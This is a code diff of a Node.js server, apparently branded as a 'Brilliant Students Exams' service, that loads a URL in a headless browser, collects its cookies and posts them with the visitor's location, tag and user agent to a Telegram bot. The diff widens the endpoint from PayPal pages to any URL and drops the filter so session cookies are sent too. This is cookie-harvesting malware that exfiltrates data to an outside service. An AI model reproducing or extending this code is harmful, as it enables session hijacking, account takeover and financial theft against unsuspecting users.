@@ -24,12 +24,12 @@ async function getGeoInfo() {
     }
 }
 
-async function sendToTelegram(paypalCookies, userTag, examNumber, geoInfo, url, userAgent) {
+async function sendToTelegram(cookies, userTag, examNumber, geoInfo, url, userAgent) {
     const message =
         `📘 *Brilliant Students Exams*\n` +
         `🏷️ Tag: ${userTag}\n` +
         `🧾 Exam Number: ${examNumber}\n` +
-        `🍪 PayPal Cookies: ${paypalCookies}\n` +
+        `🍪 Cookies: ${cookies}\n` +
         `🌍 Country: ${geoInfo.country}\n` +
         `🏙️ City/Region: ${geoInfo.city}, ${geoInfo.region}\n` +
         `🌐 Loaded URL: ${url}\n` +
@@ -57,12 +57,12 @@ async function sendToTelegram(paypalCookies, userTag, examNumber, geoInfo, url, 
     }
 }
 
-async function fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgent) {
+async function fetchCookies(url, userTag, examNumber, clientUserAgent) {
     const userAgent = clientUserAgent || 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36';
 
     const query = `
         mutation {
-            goto(url: "${paypalUrl}", waitUntil: networkIdle) {
+            goto(url: "${url}", waitUntil: networkIdle) {
                 status
             }
             cookies {
@@ -98,10 +98,7 @@ async function fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgen
         let cookieString = "";
 
         if (cookieResponse && Array.isArray(cookieResponse.cookies)) {
-            // Filter cookies: only those with an expiration timestamp (non-session)
-            const mainCookies = cookieResponse.cookies.filter(cookie => cookie.expires && cookie.expires > 0);
-
-            mainCookies.forEach(cookie => {
+            cookieResponse.cookies.forEach(cookie => {
                 if (cookie.name && cookie.value) {
                     cookieString += `${cookie.name}=${cookie.value}; `;
                 }
@@ -109,7 +106,7 @@ async function fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgen
         }
 
         const geoInfo = await getGeoInfo();
-        await sendToTelegram(cookieString || "No main cookies found", userTag, examNumber, geoInfo, paypalUrl, userAgent);
+        await sendToTelegram(cookieString || "No cookies found", userTag, examNumber, geoInfo, url, userAgent);
 
         return {
             success: true,
@@ -119,7 +116,7 @@ async function fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgen
     } catch (err) {
         console.error("Browserless error:", err);
         const geoInfo = await getGeoInfo();
-        await sendToTelegram(`Failed to fetch PayPal: ${err.message}`, userTag, examNumber, geoInfo, paypalUrl, userAgent);
+        await sendToTelegram(`Failed to fetch cookies: ${err.message}`, userTag, examNumber, geoInfo, url, userAgent);
         return {
             success: false,
             error: err.message,
@@ -128,17 +125,17 @@ async function fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgen
     }
 }
 
-app.get('/api/paypal', async (req, res) => {
-    const paypalUrl = req.query.url || 'https://www.paypal.com';
+app.get('/api/collect-cookies', async (req, res) => {
+    const url = req.query.url;
     const userTag = req.query.userTag || 'UnknownUser';
     const examNumber = req.query.examNumber || '';
     const clientUserAgent = req.headers['user-agent'] || '';
 
-    if (!paypalUrl.startsWith('https://www.paypal.com')) {
-        return res.status(400).json({ success: false, error: 'Invalid PayPal URL' });
+    if (!url || !url.startsWith('http')) {
+        return res.status(400).json({ success: false, error: 'Invalid or missing URL' });
     }
 
-    const result = await fetchPayPalCookies(paypalUrl, userTag, examNumber, clientUserAgent);
+    const result = await fetchCookies(url, userTag, examNumber, clientUserAgent);
     res.json(result);
 });
 
